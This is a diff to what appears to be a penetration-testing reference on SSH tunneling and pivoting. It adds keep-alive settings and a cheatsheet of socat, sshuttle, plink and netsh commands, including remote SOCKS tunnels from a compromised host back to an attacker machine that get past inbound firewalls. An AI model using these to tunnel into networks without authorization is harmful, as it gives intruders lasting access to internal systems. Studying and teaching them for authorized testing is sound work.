@@ -2,6 +2,36 @@
 
 Complete reference for port redirection and SSH tunneling techniques including Socat, SSH local/dynamic/remote forwarding, sshuttle, Windows ssh.exe, Plink, Netsh, and Proxychains configuration.
 
+> **Related:** For full network pivoting (Ligolo-ng TUN, Chisel SOCKS, multi-hop/double pivots, proxychains tuning), see `06-tunneling-and-pivoting/pivoting/pivoting-chisel-ligolo-proxychains.md`. SSH forwarding below is the built-everywhere primitive; reach for Ligolo when you need direct tooling (full nmap/UDP) without proxychains.
+
+---
+
+## SSH Multiplexing & Keep-Alive (Reliability)
+
+Long-lived tunnels drop. Harden them:
+
+```bash
+# ~/.ssh/config (per-host or *) — control socket reuse + keepalives + auto-restart
+Host pivot
+  HostName 10.4.50.215
+  User database_admin
+  ServerAliveInterval 30
+  ServerAliveCountMax 3
+  ExitOnForwardFailure yes
+  ControlMaster auto
+  ControlPath ~/.ssh/cm-%r@%h:%p
+  ControlPersist 10m
+
+# Reuse the master connection for instant new forwards:
+ssh -O forward -L 4455:172.16.50.217:445 pivot   # add a forward to a live session
+ssh -O cancel  -L 4455:172.16.50.217:445 pivot   # remove it
+ssh -O check pivot                               # is the master alive?
+
+# Auto-reconnecting tunnel (poor-man's autossh):
+while true; do ssh -N -D 9999 pivot; sleep 5; done
+# or use autossh: autossh -M 0 -N -D 9999 pivot
+```
+
 ---
 
 ## Decision Tree
@@ -395,3 +425,47 @@ cmd.exe /c echo y | plink.exe [options]
 4. Create dedicated users for port forwarding
 5. Document all active port forwards
 6. Consider timing and connection patterns for stealth
+
+---
+
+## Cheatsheet
+
+```bash
+# Local forward (reach internal:445 via local:4455)
+ssh -N -L 4455:172.16.50.217:445 user@pivot
+
+# Dynamic SOCKS (proxychains everything)
+ssh -N -D 9999 user@pivot                 # then socks5 127.0.0.1 9999
+
+# Remote forward (target -> attacker; beats inbound firewall)
+ssh -N -R 2345:10.4.50.215:5432 kali@10.10.14.7
+
+# Remote dynamic SOCKS on attacker (from compromised host)
+ssh -N -R 9998 kali@10.10.14.7            # OpenSSH client 7.6+
+
+# VPN-like (whole subnets, needs SSH creds + root on client)
+sshuttle -r user@pivot 10.4.50.0/24 172.16.50.0/24 --dns
+
+# socat plain forward
+socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+
+# Windows
+ssh.exe -N -R 9998 kali@10.10.14.7
+plink.exe -ssh -l kali -pw pass -R 127.0.0.1:9833:127.0.0.1:3389 10.10.14.7
+netsh interface portproxy add v4tov4 listenport=2222 connectport=22 connectaddress=10.4.50.215
+
+# Verify
+ss -ntlp | grep <PORT>                    # linux
+netstat -anp TCP | find "<PORT>"          # windows
+```
+
+---
+
+## References
+
+- OpenSSH man pages (`ssh(1)`, `ssh_config(5)`): https://man.openbsd.org/ssh
+- sshuttle: https://github.com/sshuttle/sshuttle
+- autossh: https://www.harding.motd.ca/autossh/
+- proxychains-ng: https://github.com/rofl0r/proxychains-ng
+- HackTricks — Tunneling & Port Forwarding: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html
+- Ligolo-ng (preferred for full pivoting): https://github.com/nicocha30/ligolo-ng
